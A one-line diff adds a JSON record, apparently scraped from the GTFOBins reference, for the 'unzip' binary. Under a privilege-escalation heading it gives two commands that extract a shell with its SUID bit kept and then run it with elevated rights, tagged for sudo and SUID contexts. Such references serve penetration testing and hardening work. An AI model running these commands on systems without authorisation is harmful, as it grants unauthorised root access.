@@ -1,0 +1,1 @@
+{"title": "unzip", "source": "gtfobins", "source_label": "GTFOBins", "path": "unzip", "html": "<h1>unzip</h1>\n<h2>Privilege Escalation</h2>\n<pre><code class=\"language-bash\">unzip -K shell.zip\n./sh -p</code></pre>", "excerpt": "unzip Privilege Escalation unzip -K shell.zip ./sh -p", "tags": ["func:privilege-escalation", "ctx:sudo", "ctx:suid"]}
